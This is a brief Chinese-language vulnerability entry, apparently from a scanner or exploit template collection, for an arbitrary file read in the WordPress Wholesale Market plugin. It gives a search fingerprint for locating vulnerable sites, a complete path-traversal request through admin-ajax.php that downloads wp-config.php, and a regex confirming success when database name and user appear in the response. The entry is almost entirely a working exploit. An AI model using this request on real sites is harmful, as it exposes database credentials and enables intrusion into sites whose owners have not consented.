# WordpressWholesaleMarket任意文件读取漏洞

WordPress ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="wp-content/plugins/wholesale-market"`
- **请求**：`GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP`
- **响应特征**：200 ^(?=.*?DB_NAME)(?=.*?DB_USER).*?$